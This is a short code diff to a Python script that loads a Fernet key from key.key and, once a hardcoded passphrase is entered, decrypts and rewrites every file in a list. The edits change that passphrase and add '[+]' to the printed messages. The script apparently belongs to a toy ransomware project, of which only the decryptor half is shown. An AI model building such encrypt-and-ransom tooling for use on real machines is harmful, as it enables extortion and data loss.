@@ -13,8 +13,8 @@ print(allfiles)
 with open("key.key","rb") as key:
     password = key.read()
 
-passphase="madjack"
-userphase=input("enter the phases phase i have given u ") 
+passphase="enter your screct password"
+userphase=input("[+]enter the phases phase i have given u ") 
 
 if passphase==userphase:
     for file in allfiles:
@@ -23,6 +23,6 @@ if passphase==userphase:
         content_decr = Fernet(password).decrypt(content)
         with open(file,"wb") as thefile:
             thefile.write(content_decr)
-        print("the files are decrypted")
+        print("[+]the files are decrypted")
 else:
-    print("the password is worng pls enter the coi")
+    print("[+] the password is worng pls enter the correct password")
